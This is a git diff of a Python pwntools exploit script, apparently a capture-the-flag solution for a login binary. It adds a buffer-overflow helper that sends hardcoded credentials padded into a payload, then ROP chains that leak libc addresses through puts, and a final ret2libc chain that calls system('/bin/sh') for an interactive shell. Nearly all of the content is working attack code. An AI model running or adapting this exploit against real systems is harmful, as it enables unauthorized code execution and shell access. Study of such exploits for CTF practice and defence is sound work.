@@ -52,14 +52,62 @@ continue
 # RELRO:      Full RELRO
 # Stack:      Canary found
 # NX:         NX enabled
-# PIE:        PIE enabled
+# PIE:        no pie
 # Stripped:   No
 # Debuginfo:  Yes
-
-io = start()
 
 usr = "n1k0th3gr3@t"
 pwd = "cr1st1n@scks"
 
+def send_payload(_io: process | connect, payload: bytes, _usr: str = usr, _pwd: str = pwd, get: bool = True) -> bytes:
+    _io.recvuntil(b"name: ")
+    _io.sendline(_usr.encode('ascii'))
+    _io.recvuntil(b"word: ")
+    _io.sendline(_pwd.encode('ascii') + b"A" * (32 - len(_pwd)) + payload)
+    _io.recvuntil(b"\n")
+    ret = b""
+    if get:
+        return _io.recvuntil(b"\n", drop=True)
+    return ret
+
+io = start()
+
+io.recvuntil(b"-- N1k0")
+
+# start rop chain
+syms = ["puts", "printf", "read", "strncmp", "exit"]
+addrs = {}
+
+for sym in syms:
+    # chain
+    rop = ROP(exe)
+    rop.puts(exe.got[sym])
+    rop.main()
+
+    # payload
+    payload = b"A" * 8
+    payload += rop.chain()
+
+    # sending
+    io.debug(f"Sending payload: {payload}")
+    addrs[sym] = unpack(send_payload(io, payload).ljust(8, b'\0'))
+
+    # logging
+    io.info(f"Leaked address of {sym}@libc: {hex(addrs[sym])}")
+
+# confirming libc
+libc.address = addrs[syms[0]] - libc.sym[syms[0]]
+assert libc.address & 0xfff == 0
+for sym in syms:
+    io.debug(f"{sym}: {hex(libc.sym[sym])}@libc, {hex(addrs[sym])}@leak")
+    #assert libc.sym[sym] == addrs[sym]
+
+# getting a shell
+rop = ROP(libc)
+rop.raw(rop.ret)
+rop.system(next(libc.search(b"/bin/sh")))
+
+# sending payload
+send_payload(io, (b"A" * 8) + rop.chain(), get=False)
 io.interactive()
 
